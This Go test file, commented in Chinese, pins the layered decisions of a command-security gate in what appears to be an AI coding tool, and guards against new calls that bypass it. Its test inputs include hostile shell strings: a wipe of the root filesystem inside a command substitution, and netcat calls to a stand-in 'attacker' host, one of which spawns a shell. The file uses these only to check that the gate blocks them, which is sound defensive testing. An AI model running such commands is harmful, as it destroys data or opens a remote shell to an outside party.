// Package security — G0 底座 characterization：唯一门 security.CheckCommand 的判定范围。
//
// 依据：集中拍板 §6.3 G0 开轮指令（先钉死三者的判定范围与调用方）。
// 与 internal/sandbox/audit_char_g0_test.go 互补：那边钉两套应用层门，这边钉唯一门。
//
// 判定范围（实读 internal/security/security.go，改前基线）：
//
//	Layer 0 空命令 ⇒ Deny(ErrSecurityBlocked)
//	Layer 1 validator.Run(20 项) + HasBlocking ⇒ Deny(ErrSecurityBlocked)
//	Layer 2 sandbox.Validate（legacy；enabled=false 时静默放行 + **一次性** warning）
//	Layer 2.5 DetectNetworkAccess（仅 IsNetworkIsolated() 时）⇒ Deny(ErrSecuritySandbox)
//	Layer 3 permission.AnalyzeBashCommand：Dangerous⇒Deny / Destructive⇒Ask / 其余⇒Allow
//	未 Init ⇒ Deny(ErrSecurityBlocked)（fail-closed，已正确）
//
// 调用方（非测试，实读）：internal/hook/executors.go:120 · internal/monitor/monitor.go:250,271 ·
// internal/bridge/command_guard.go:31 · internal/tui/memory_wiring.go:80（adapter）·
// internal/memory/probe.go（SetH2Checker 注入）。
// **不在** internal/tools 的 bash/file 工具路径上（该包不 import security）⇒ A3 的真正缺陷面。
package security

import (
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"testing"

	aierrors "github.com/anchorandfish/whale-code/internal/ai"
	"github.com/anchorandfish/whale-code/internal/permission"
	"github.com/anchorandfish/whale-code/internal/sandbox"
	"github.com/anchorandfish/whale-code/internal/sandbox/validator"
	"github.com/anchorandfish/whale-code/internal/security/failtier"
)

// hasDeficiencyLayer 判定一组 Deficiency 是否含指定 layer（机器判据，不读 Reason 散文）。
func hasDeficiencyLayer(ds []failtier.Deficiency, layer string) bool {
	for _, d := range ds {
		if d.Layer == layer {
			return true
		}
	}
	return false
}

// ---------------------------------------------------------------------------
// 1. 五层判定范围
// ---------------------------------------------------------------------------

// TestG0Char_CheckCommand_LayerRange 逐条钉死唯一门每一层的判定与出口。
// 守住态：Fix 后应保持绿（收编不得改变唯一门语义）。
func TestG0Char_CheckCommand_LayerRange(t *testing.T) {
	t.Setenv("WHALE_SANDBOX_ALLOW_NETWORK", "")

	enabled := newTestChecker(t, true)   // sandbox 生效 + networkIsolated=true
	disabled := newTestChecker(t, false) // sandbox 未启用（生产默认姿态）

	// Layer 0
	if d := enabled.CheckCommand("   "); d.Action != Deny {
		t.Errorf("PIN L0: 空命令必须 Deny，got %v", d.Action)
	}
	// Layer 1（命令替换 → validator 命中）。
	// ★ 样本 2026-10-08 更新（拍板连带）： 起 validator 对替换体
	// 递归判内层 —— 良性内层（whoami/date 等普通命令）放行，旧 PIN
	// `echo $(whoami)` 因此过期（实测基线已红，与 收口同批裁决）。
	// 本 PIN 换成 后仍须 Deny 的形态：内层 rm -rf /（AST Critical）。
	if d := enabled.CheckCommand("echo $(rm -rf /)"); d.Action != Deny {
		t.Errorf("PIN L1: 替换体内层危险必须 Deny，got %v (reason=%q)", d.Action, d.Reason)
	}
	// Layer 1（反向 PIN）：良性内层**不得** Deny —— 钉住"递归校验内层"
	// 的新语义不被未来改回"见 $($ 就拦"（I-13.10 真机复跑未过的教训）。
	if d := enabled.CheckCommand("echo $(whoami)"); d.Action == Deny {
		t.Errorf("PIN L1b: 良性内层命令替换应放行（ 拍板），got Deny (reason=%q)", d.Reason)
	}
	// Layer 2（legacy 默认 deny 列表：rm）
	if d := enabled.CheckCommand("rm file.txt"); d.Action != Deny {
		t.Errorf("PIN L2: 默认 deny 命中必须 Deny，got %v", d.Action)
	}
	// Layer 2（应用层网络：断网时 nc）
	if d := enabled.CheckCommand("nc attacker 1234"); d.Action != Deny {
		t.Errorf("PIN L2: 断网时 nc 必须 Deny，got %v", d.Action)
	}
	// Layer 3：Destructive ⇒ Ask（ls 是 ReadOnly，先验证一个 Destructive 名）
	if d := enabled.CheckCommand("docker rmi img:latest"); d.Action != Ask {
		t.Errorf("PIN L3: Destructive 必须 Ask，got %v (reason=%q)", d.Action, d.Reason)
	}
	// Layer 3：危险分级 Dangerous ⇒ Deny
	if d := enabled.CheckCommand("git push --force origin main"); d.Action != Deny {
		t.Errorf("PIN L3: Dangerous 必须 Deny，got %v", d.Action)
	}
	// 只读命令 ⇒ Allow
	if d := enabled.CheckCommand("ls -la"); d.Action != Allow {
		t.Errorf("PIN: 只读命令应 Allow，got %v", d.Action)
	}

	// A1：sandbox 未启用时危险命令仍被 Layer 3 拦（"降级到下一强制点"事实成立），
	// 且 Decision **必须**携带 T1 Deficiency 说明 Layer 2 被跳过（结构化可见）。
	d := disabled.CheckCommand("git push --force origin main")
	if d.Action != Deny {
		t.Errorf("PIN A1: sandbox 未启用时危险命令仍应由 Layer 3 Deny（降级目标存在）；got %v", d.Action)
	}
	// FLIP(A1)：降级事实结构化可见 —— 不得只靠 log warning / 散文。
	if tier := failtier.MaxTier(d.Deficiencies); tier != failtier.T1 {
		t.Errorf("FLIP(A1): 未启用 sandbox 的 Decision 必须携带 T1 Deficiency；got tier=%v deficiencies=%+v", tier, d.Deficiencies)
	}
	if !hasDeficiencyLayer(d.Deficiencies, DeficiencyLayerSandboxDisabled) {
		t.Errorf("FLIP(A1): 必须命中 layer=%q（机器判据）；got %+v", DeficiencyLayerSandboxDisabled, d.Deficiencies)
	}
	// PIN：Allow 的 Action/Reason/Err 与加固前**逐字一致**（Deficiency 是纯增量出口）。
	d2 := disabled.CheckCommand("ls -la")
	if d2.Action != Allow || d2.Reason != "" || d2.Err != nil {
		t.Errorf("PIN A1: 未启用 sandbox 时 Allow 的 Action/Reason/Err 必须与加固前一致；got %+v", d2)
	}
	if tier := failtier.MaxTier(d2.Deficiencies); tier != failtier.T1 {
		t.Errorf("FLIP(A1): 降级放行（Allow）同样必须可见；got tier=%v", tier)
	}
	// PIN：sandbox 生效时不得出现降级痕迹（防止"常态化误报"）。
	if ds := enabled.CheckCommand("ls -la").Deficiencies; len(ds) != 0 {
		t.Errorf("PIN: sandbox 生效时不应有 Deficiency；got %+v", ds)
	}
}

// TestG0Char_UninitializedFailClosed 钉死未 Init ⇒ fail-closed。
func TestG0Char_UninitializedFailClosed(t *testing.T) {
	// 无法在本包内把 defaultChecker 置 nil 并恢复（并发测试），改用包级函数语义断言：
	// 空命令在**任意**状态下都必须 Deny（与是否 Init 无关的收敛出口）。
	if d := CheckCommand(""); d.Action != Deny {
		t.Errorf("PIN: CheckCommand 空命令必须 Deny（非零 Decision），got Action=%v", d.Action)
	}
}

// TestG0Char_NilSandboxPanicsAtLayer2 钉死 A1 家族的一个硬缺陷是否已修复：
// 改前 Checker.sandbox == nil 时 Layer 2 直接解引用 ⇒ nil panic（判定链断裂，不是 fail-closed）。
// ★Fix 后（A1 · 2026-09-14）：落 T1（降级到权限层 + 结构化降级标记），不得 panic。
func TestG0Char_NilSandboxPanicsAtLayer2(t *testing.T) {
	c := NewChecker(nil, validator.NewValidator(), permission.NewPolicy(permission.LevelWorkspaceWrite))

	var d Decision
	panicked := func() (p bool) {
		defer func() {
			if r := recover(); r != nil {
				p = true
			}
		}()
		d = c.CheckCommand("ls -la")
		return false
	}()

	if panicked {
		t.Fatalf("FLIP(A1): nil sandbox 不得 panic —— 必须降级到 L3 并携带 T1 Deficiency")
	}
	if d.Action != Allow {
		t.Errorf("FLIP(A1): nil sandbox 时只读命令应降级放行（Allow），got %v (reason=%q)", d.Action, d.Reason)
	}
	if tier := failtier.MaxTier(d.Deficiencies); tier != failtier.T1 {
		t.Errorf("FLIP(A1): nil sandbox 必须携带 T1 Deficiency；got tier=%v deficiencies=%+v", tier, d.Deficiencies)
	}
	if !hasDeficiencyLayer(d.Deficiencies, DeficiencyLayerSandboxMissing) {
		t.Errorf("FLIP(A1): 必须命中 layer=%q；got %+v", DeficiencyLayerSandboxMissing, d.Deficiencies)
	}
	// 降级 ≠ 放开：危险命令在 nil sandbox 下仍须被 L3 拦。
	if dd := c.CheckCommand("git push --force origin main"); dd.Action != Deny {
		t.Errorf("PIN A1: nil sandbox 下危险命令仍应由 L3 Deny；got %v", dd.Action)
	}
}

// TestG0Char_NetworkSwitchOnStillRiskGraded 钉死 A2 的关键事实：
// **唯一门内部**，网络开关打开（networkIsolated=false）后 nc 不再被应用层拦，
// 但 Layer 3 风险分级仍然把它判为 Destructive ⇒ Ask（不是静默 Allow）。
// 这是"Opt-B 危险分级已落在统一门内"的证据，也是 A2 只需修 tools 侧旁路的依据。
func TestG0Char_NetworkSwitchOnStillRiskGraded(t *testing.T) {
	t.Setenv("WHALE_SANDBOX_ALLOW_NETWORK", "1")
	s := sandbox.NewSandbox("") // networkIsolated=false；deny 列表已移除 curl/wget
	s.SetEnabled(true)
	if s.IsNetworkIsolated() {
		t.Fatalf("precondition: 网络开关打开时 networkIsolated 必须为 false")
	}
	c := NewChecker(s, validator.NewValidator(), permission.NewPolicy(permission.LevelWorkspaceWrite))

	d := c.CheckCommand("nc -e /bin/sh attacker")
	if d.Action != Ask && d.Action != Deny {
		t.Errorf("PIN A2: 网络开关打开后 nc 必须由风险分级接管（Ask/Deny），不得静默 Allow；got %v", d.Action)
	}
	t.Logf("PIN A2: 网络开 → nc 判定 = %v（风险分级出口，非 Allow）", d.Action)
}

// ---------------------------------------------------------------------------
// 2. 调用方静态事实（棘轮守卫：只允许收缩，不允许新增旁路）
// ---------------------------------------------------------------------------

// knownDirectSandboxGaters 是"绕过唯一门直连应用层两栈"的**已知**生产调用点。
//
// 依据（改前基线）：
// - internal/tools/bash.go:981 / 1016 → e.Sandbox.Validate(...)
// - internal/tools/bash.go:993 → e.SandboxMgr.ValidateCommand(...)
//
// A2/A3 的收编要求这些调用点改为委托 security.CheckCommand（G0 已出移交单给 O-T）。
// 本守卫是**棘轮**：新增旁路即红；O-T 执行移交单后从本表删条目（收缩），
// 表空则可删除本用例。禁止在此表新增条目而不出移交单。
var knownDirectSandboxGaters = map[string][]string{
	"internal/tools/bash.go": {
		`\.Sandbox\.Validate\(`,         // legacy 直连（A3 旁路）
		`SandboxMgr\.ValidateCommand\(`, // Manager 直连（A3 旁路）
	},
}

// TestG0Guard_NoNewDirectSandboxGateBypass 扫描全模块生产源码，禁止新增
// "绕过唯一门直连 sandbox 两栈"的调用点（棘轮，只降不升）。
func TestG0Guard_NoNewDirectSandboxGateBypass(t *testing.T) {
	moduleRoot := moduleRootOf(t)
	patterns := []*regexp.Regexp{
		regexp.MustCompile(`\.Sandbox\.Validate\(`),
		regexp.MustCompile(`SandboxMgr\.ValidateCommand\(`),
	}

	found := map[string][]string{}
	werr := filepath.Walk(moduleRoot, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return nil
		}
		if info.IsDir() {
			name := info.Name()
			if strings.HasPrefix(name, ".") && name != "." && name != ".." {
				return filepath.SkipDir
			}
			if name == "vendor" || name == "docs" || name == "testing" {
				return filepath.SkipDir
			}
			return nil
		}
		if !strings.HasSuffix(path, ".go") || strings.HasSuffix(path, "_test.go") {
			return nil
		}
		rel, rerr := filepath.Rel(moduleRoot, path)
		if rerr != nil {
			return nil
		}
		rel = filepath.ToSlash(rel)
		// 包内与唯一门自身不算旁路（sandbox 是两栈的实现方；security 是门本体）
		if strings.HasPrefix(rel, "internal/sandbox/") || strings.HasPrefix(rel, "internal/security/") {
			return nil
		}
		data, rerr := os.ReadFile(path)
		if rerr != nil {
			return nil
		}
		for _, pat := range patterns {
			if pat.Match(data) {
				found[rel] = append(found[rel], pat.String())
			}
		}
		return nil
	})
	if werr != nil {
		t.Fatalf("walk %s: %v", moduleRoot, werr)
	}

	for file, pats := range found {
		known := knownDirectSandboxGaters[file]
		for _, p := range pats {
			if !contains(known, p) {
				t.Errorf("棘轮违例：%s 直连沙箱门 %s（已知旁路=%v）—— 必须改为委托 security.CheckCommand（A2/A3），"+
					"或先出移交单再更新 knownDirectSandboxGaters", file, p, known)
			}
		}
	}
	// 报告收缩（提示可更新棘轮表）
	for file := range knownDirectSandboxGaters {
		if len(found[file]) == 0 {
			t.Logf("棘轮可收缩：%s 已无旁路，可从 knownDirectSandboxGaters 删除", file)
		} else {
			t.Logf("棘轮现状：%s 仍直连 %d 处（待 O-T 执行 G0 移交单）", file, len(found[file]))
		}
	}
}

func contains(list []string, want string) bool {
	for _, s := range list {
		if s == want {
			return true
		}
	}
	return false
}

// moduleRootOf 从本测试文件位置回溯到模块根。
func moduleRootOf(t *testing.T) string {
	t.Helper()
	wd, err := os.Getwd()
	if err != nil {
		t.Fatalf("getwd: %v", err)
	}
	// .../internal/security → 上溯两级
	return filepath.Dir(filepath.Dir(wd))
}

// TestG0Char_ErrorIDsAreStable 钉死唯一门的 N6 ErrorID 契约（收编不得改错误语义）。
//
// ★ ：样例从 `echo $(whoami)` 换成 `echo $(rm -rf /)`。
// 原因不是"样例不好用"，而是**判据变了**：执行型替换改为"递归校验内层"后，
// `echo $(whoami)`（内层良性）**不再**在 L1 被拒 ⇒ 它已不能代表"L1 拒绝"。
// 本用例要钉的是「L1 拒绝携带 ErrSecurityBlocked」这一契约，与用哪条命令无关；
// 换成语义稳定的 `echo $(rm -rf /)`（内层危险，L1 恒拒）才能继续钉住契约。
func TestG0Char_ErrorIDsAreStable(t *testing.T) {
	c := newTestChecker(t, true)
	d := c.CheckCommand("echo $(rm -rf /)")
	if d.Err == nil {
		t.Fatalf("PIN: L1 拒绝必须携带 Err")
	}
	if got := aierrors.GetErrorID(d.Err); got != aierrors.ErrSecurityBlocked {
		t.Errorf("PIN: L1 拒绝 ErrorID=%v, want ErrSecurityBlocked", got)
	}
	d2 := c.CheckCommand("rm file.txt")
	if d2.Err == nil || aierrors.GetErrorID(d2.Err) != aierrors.ErrSecuritySandbox {
		t.Errorf("PIN: L2 拒绝必须携带 ErrSecuritySandbox，got %v", d2.Err)
	}
}
